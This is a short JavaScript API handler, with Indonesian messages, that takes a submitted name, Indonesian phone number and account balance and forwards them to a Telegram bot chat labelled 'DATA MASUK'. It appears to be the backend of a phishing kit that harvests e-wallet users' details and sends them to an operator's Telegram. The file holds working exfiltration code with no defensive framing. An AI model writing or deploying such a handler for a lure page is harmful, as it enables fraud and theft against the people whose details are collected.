import { token, chat_id } from "./config";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  try {
    const { nama, nohp, saldo } = req.body;

    if (!nama || !nohp || !saldo) {
      return res.status(400).json({ message: "Data tidak lengkap" });
    }

    const nohpClean = String(nohp).replace(/[^0-9]/g, "");

    const text =
      "DATA MASUK\n\n" +
      "nama: " + nama + "\n" +
      "nohp: +62 " + nohpClean + "\n" +
      "saldo: Rp." + saldo;

    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id,
        text,
      }),
    });

    const result = await response.json();

    if (!result.ok) {
      return res.status(500).json({ message: "Gagal kirim ke Telegram" });
    }

    return res.status(200).json({ status: "success" });

  } catch (error) {
    return res.status(500).json({ message: "Server error" });
  }
}
